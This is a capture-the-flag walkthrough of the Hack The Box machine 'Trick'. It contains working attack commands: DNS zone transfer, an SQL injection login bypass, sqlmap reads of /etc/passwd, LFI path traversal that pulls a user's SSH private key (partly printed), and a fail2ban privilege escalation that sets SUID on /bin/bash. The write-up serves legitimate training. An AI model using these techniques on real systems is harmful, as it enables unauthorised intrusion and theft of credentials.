# [OK] - Trick

---

| Difficult: | Easy |
| --- | --- |
| OS: | Linux |
| Last edit: | 26/08/22 |

As always we will append the following line to the hosts file of our linux:

```bash
	10.10.11.166       trick.htb
```

The first step we will perform a port scan with **Nmap tool.** With port scan, was discoverer 4 ports opened with some services running. The services most interests to us now were HTTP, DNS and SMTP servers.

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -sS -T5 10.10.11.166
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
25/tcp open  smtp    Postfix smtpd
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
80/tcp open  http    nginx 1.14.2
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

For each service we will investigate with more details with to find any vulnerability, miss configuration whatever. 

## DNS Service [53/TCP]

For this will be use the the Guide HackTriks Pentesting DNS learn about how to exploit this service.

[53 - Pentesting DNS](https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns)

<aside>
📌 Collected information:

- Running on port 53 TCP
- BIND version 9.11.5-P4
- Host Linux Debian
</aside>

**DNS Queries**

The nslookup queries the specified DNS server and retrieves the requested records that are associated with the domain name you provided. These records contain information like the domain name’s IP addresses. So, the domain name to machine IP is queries ***trick.htb.*** 

![Untitled](pics/Untitled.png)

**Zone Transfer**

DNS zone transfer is the process of transferring a copy of the DNS zone file from the primary DNS server to a secondary DNS server. The DNS server use zone transfer to distribute changes mate to the main server to secondary servers. We will use the DNS zone transfer to enumerate  obtain host names, machines names, IP e etc.

In DNS enumeration using zone transfer is retrieve a copy of the entire zone file for a domain from the DNS server. To perform this attack is send a zone-transfer requesto to DNS server pretending to be a client; the DNS server then send a the database zone.

```bash
dig axfr @<DNS_IP> <DOMAIN> #Try zone transfer guessing the domain
```

![Untitled](pics/Untitled%201.png)

The zone transfer revealed additional sub-domains. that we will add in linux hosts file:

- trick.htb
- root.trick.htb
- preprod-payroll.trick.htb

![Untitled](pics/Untitled%202.png)

Ok, for each subdomain was tried to acesses with web browser. We fond a login page when accessed the subdomain [http://preprod-payroll.trick.htb](http://preprod-payroll.trick.htb/login.php). The login page was developed in **PHP.**

![Untitled](pics/Untitled%203.png)

Testing some payloads on login fields was fond a **SQLi Vulnerability,** that allow to bypass the authentication and access the next page. The payload SQLI used was **`' or '1'='1`** on field *password,* and to the user filed setup `admin@admin.com` but, it does not matter.

[SQL injection | OWASP Bricks Login page #1](https://sechow.com/bricks/docs/login-1.html)

Was opened the Recruitment Management System page below as Administrator.

![Untitled](pics/Untitled%204.png)

The application has many vulnerability. Some important formations was collected:

- User Administrator
    - Name: Administrator
    - Username: Enemigosss
    - Password: SuperGucciRainbowCake

Looking for SQLI failures, in the employee registration tab we capture the AJAX request and save it in a file. With this request we can append to **sqlmap** tool. We find that the database in question is a MySQL≥ 5.0.12 and there are vulnerable parameters.

```bash
POST /ajax.php?action=login HTTP/1.1
Host: preprod-payroll.trick.htb
Content-Length: 32
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://preprod-payroll.trick.htb
Referer: http://preprod-payroll.trick.htb/login.php
Accept-Encoding: gzip, deflate
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=6p2q7se987tbm0lg55353f6nlm
Connection: close

username=admin&password=password
```

[SQLMap - Cheetsheat](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap)

Here i wish a shell, but we tried some tags for get a bash with **sqlmap**, but none worked. We can only read flies. So, we can read the `/etc/passwd` and we get the users `root` and `michael`.

```bash
sqlmap -r request.txt --level 3 --batch --file-read=/etc/passwd
```

`root:x:0:0:root:/root:/bin/bash`

`michael:x:1001:1001::/home/michael:/bin/bash`

We performed the dump of some user tables in order to find credentials for one of these users but without success. We only found the credentials for the username `Enmigosss` but it is just a web application user and not a system user.

```bash
sqlmap -r request.txt --level 3 -dbms=mysql --batch -D payroll_db -T users --dump
```

![Untitled](pics/Untitled%205.png)

Using the **wfuzz** tool for subdomains fuzzing and was found `preprod-marketing.trick.htb` subdomain. With this we add the new subdomain to the file `/etc/hosts` for have access with web browser.

```bash
wfuzz -c -w ./wordlists/subdomains-top1million-110000.txt -H "Host: preprod-FUZZ.trick.htb" -u 10.10.11.166  --hw 475
```

![Untitled](pics/Untitled%206.png)

```bash
wfuzz -c -w ./wordlists/subdomains-top1million-110000.txt -H "Host: FUZZ-payroll.trick.htb" -u 10.10.11.166  --hw 475
```

![Untitled](pics/Untitled%207.png)

![Untitled](pics/Untitled%208.png)

A linux file inclusion (LFI) wordlist was tested to facilitate visualization and to identify promising results.

[O que é LFI? (hacking).](https://medium.com/@juangrimm/o-que-%C3%A9-lfi-hacking-3bc709dfb5da)

An attacker can use Local File Inclusion (LFI) to trick the web application into exposing or running files on the web server. An LFI attack may lead to information disclosure, remote code execution, or even Cross-site Scripting (XSS). Typically, LFI occurs when an application uses the path to a file as input. If the application treats this input as trusted, a local file may be used in the include statement.

The parameter `—hh 0` was added, which hides valid requests but does not bring any characters on the page. As we see in the image below, LFI vulnerabilities were found. To validate I inserted one of these payloads in the URL in the Browser and the application actually returned the file `/etc/passwd`.

```jsx
wfuzz -w ./Wordlists/file_inclusion_linux.txt -u http://preprod-marketing.trick.htb/index.php?page=FUZZ --hh 0
```

![Untitled](pics/Untitled%209.png)

We get the first user-level flag:

```bash
[http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//....//....//....//....//....//....//....//home/michael/user.txt](http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//....//....//....//....//....//....//....//home/michael/user.txt)
```

We check with the URL that an SSH key exists:

```bash
[http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//....//....//....//....//....//....//....//home/michael/.ssh/id_rsa](http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//....//....//....//....//....//....//....//home/michael/.ssh/id_rsa) 
```

Let's copy and use to log in via SSH:

```jsx
curl "preprod-marketing.trick.htb/index.php?page=..././..././..././home/michael/.ssh/id_rsa" > id_rsa_michael

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz

---HIDE---

jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

With an SSH session established we can investigate vulnerability points to escalate privilege or how get the root flag.

![Untitled](pics/Untitled%2010.png)

The command `sudo -l` show that we have permission to restart the service ***fail2ban*** with user sudo. This information may be used to privilege escalate.w

![Untitled](pics/Untitled%2011.png)

More information can be find in [****Fail2Ban****](https://www.notion.so/Fail2Ban-04b8156fc1194f40b3c1ef67acb9cb55).

![Untitled](pics/Untitled%2012.png)

We are apart of the security group that can write to this directory. We can also move files, by default when a user is banned, the `iptables-multiport.conf` is ran. We can move this file (renaming it to `iptables-multiport.conf.bk` and re-creating it with write permissions.

The new file `iptables-multiport.conf` can be as below.

```bash
# FILE: iptables-multport.conf

[INCLUDES]

before = iptables-common.conf

[Definition]

# Enable SUID when start this action
**actionstart = chmod u+s /bin/bash**

actionstop = <iptables> -D <chain> -p <protocol> -m multiport --dports <port> -j f2b-<name>
             <actionflush>
             <iptables> -X f2b-<name>

actioncheck = <iptables> -n -L <chain> | grep -q 'f2b-<name>[ \t]'

actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>

actionunban = <iptables> -D f2b-<name> -s <ip> -j <blocktype>

[Init]
```

After change the file, restart the service **fail2ban**:

```bash
$ sudo /etc/init.d/fail2ban restart

[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
```

Was used the hydra to force execute the file `iptables-multiport.conf`

```bash
hydra 10.10.11.166 ssh -l root -P ./Wordlists/directory-list-2.3-small.txt -t4  -V
```

Here, we can see that the SUID was enabled in /bin/bash:

![Untitled](pics/Untitled%2013.png)

To get the root privilege use the parameter -p and get the root flag:

![Untitled](pics/Untitled%2014.png)

That’s it… tks!

**by: rmba**

**References:** 

---

- Wordlist Directory

[](https://raw.githubusercontent.com/daviddias/node-dirbuster/master/lists/directory-list-2.3-small.txt)

- Wordlist Subdomains

[](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-110000.txt)

- Wordlist LFI

[](https://raw.githubusercontent.com/carlospolop/Auto_Wordlists/main/wordlists/file_inclusion_linux.txt)

- Fail2ban

[Fail2ban](https://www.fail2ban.org/wiki/index.php/Main_Page)